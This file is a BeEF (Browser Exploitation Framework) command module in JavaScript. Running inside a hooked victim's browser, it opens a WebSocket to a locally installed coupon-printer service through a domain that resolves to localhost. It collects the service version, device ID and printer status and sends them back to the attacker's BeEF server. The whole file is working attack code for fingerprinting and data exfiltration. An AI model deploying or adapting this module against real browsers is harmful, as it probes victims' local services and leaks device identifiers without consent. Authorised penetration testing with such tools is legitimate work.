//
// Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  if (!beef.browser.hasWebSocket()) {
    beef.debug('[Detect Coupon Printer] Error: browser does not support WebSockets');
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unsupported browser", beef.are.status_error());
  }

  //var url = 'ws://127.0.0.1:2687';
  //var url = 'ws://127.0.0.1:26876';
  var url = 'wss://printer.cpnprt.com:4004'; // resolves to 127.0.0.1

  beef.debug('[Detect Coupon Printer] Opening WebSocket connection: ' + url);
  const socket = new WebSocket(url);

  socket.addEventListener('open', function (event) {

    // Get Coupon Printer Service version
    socket.send('method=GetVersion;input=Y|;separator=|');

    // Device ID
    socket.send('method=GetDeviceID;input=Y|;separator=|');

    // Check Printer
    socket.send('method=CheckPrinter;input=Y|;separator=|');

  });

  socket.onerror = function(error) {
    beef.debug('[Detect Coupon Printer] WebSocket Error: ' + JSON.stringify(error));
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not detect coupon printer", beef.are.status_error());
  };

  socket.onclose = function(event) {
    beef.debug('[Detect Coupon Printer] Disconnected from WebSocket.');
  };

  socket.addEventListener('message', function (event) {
    beef.debug('[Detect Coupon Printer] WebSocket Response:' + event.data);
    try {
      var result = JSON.parse(event.data);
      if (result['GetVersion']) {
        beef.debug('[Detect Coupon Printer] Version: ' + result['GetVersion']);
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetVersion=" + result['GetVersion'], beef.are.status_success());
      } else if (result['GetDeviceID']) {
        beef.debug('[Detect Coupon Printer] Device ID: ' + result['GetDeviceID']);
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "GetDeviceID=" + result['GetDeviceID'], beef.are.status_success());
      } else if (result['CheckPrinter']) {
        beef.debug('[Detect Coupon Printer] Printer: ' + result['CheckPrinter']);
        beef.net.send("<%= @command_url %>", <%= @command_id %>, "CheckPrinter=" + result['CheckPrinter'], beef.are.status_success());
      }
    } catch(e) {
      beef.debug('Could not parse WebSocket response JSON: ' + event.data);
    }
  });

});

